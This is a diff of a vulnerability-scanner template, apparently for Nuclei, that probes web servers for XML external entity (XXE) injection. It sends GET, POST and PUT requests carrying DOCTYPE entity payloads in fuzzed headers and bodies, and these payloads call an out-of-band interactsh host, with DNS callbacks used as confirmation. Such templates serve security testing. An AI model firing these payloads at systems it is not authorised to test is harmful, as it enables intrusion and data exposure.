@@ -1,37 +1,34 @@
-id: xxe
-
+id: XXE_injection
 info:
-  name: xxe
-  author: k3ppf0r
+  name: XXE-injection
+  author: MR.iambatman
   severity: high
-  description: |  
-    攻击者未经授权可以访问数据库中的数据，从而盗取用户数据，造成用户信息泄露。
-  reference:
-    - 
-  remediation: |
-    打对应补丁，重启服务
-  classification:
-    cve-id: 
-    cvss-score: 7.8
-    cwe-id: CWE-611
-  metadata:
-    date: 
-    version: 
-    fofa-query: 
-  tags: xxe
-
-
-http:
+  description: XXE
+requests:
   - raw:
+      - "GET / HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\n§header§: < ! DOCTYPE foo [<!ENTITY % xxe SYSTEM \"{{interactsh-url}}\"> %xxe; ] > \nConnection: close\n< ! DOCTYPE foo [<!ENTITY % xxe SYSTEM \"{{interactsh-url}}\"> %xxe; ] >\n"
       - |
-        @timeout: 10s
-
- 
-
-    stop-at-first-match: true
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+        §header§: < ! DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{interactsh-url}}"> %xxe; ] >
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        < ! DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{interactsh-url}}"> %xxe; ] >
+      - |
+        PUT / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+        §header§: < ! DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{interactsh-url}}"> %xxe; ] >
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        < ! DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{interactsh-url}}"> %xxe; ] >
+    payloads:
+      header: helpers/payloads/request-headers.txt
+    attack: clusterbomb
+    redirects: true
     matchers:
-      - type: dsl
-        dsl:
-          - 'status_code == 200'
-        condition: and
-
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
